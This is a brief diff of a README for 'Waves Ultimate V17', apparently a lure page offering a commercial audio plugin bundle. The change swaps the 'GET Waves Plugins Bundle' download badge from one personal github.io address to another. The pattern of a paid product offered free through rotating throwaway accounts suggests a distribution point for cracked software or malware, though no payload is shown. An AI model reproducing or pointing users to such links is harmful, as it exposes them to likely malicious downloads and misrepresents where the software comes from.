@@ -1,6 +1,6 @@
 # Waves Ultimate V17 - Professional Audio Plugin Collection for Studio Production
 
-[![GET Waves Plugins Bundle](https://img.shields.io/badge/GET%20%E2%80%94%20Waves%20Plugins%20Bundle-0078D6?style=for-the-badge&logoColor=white)](https://carlottamiyamoto.github.io/.github/waves-ultimate-v17)
+[![GET Waves Plugins Bundle](https://img.shields.io/badge/GET%20%E2%80%94%20Waves%20Plugins%20Bundle-0078D6?style=for-the-badge&logoColor=white)](https://ungu08669.github.io/.github/waves-ultimate-v17)
 
 ## Studio Toolkit Overview
 
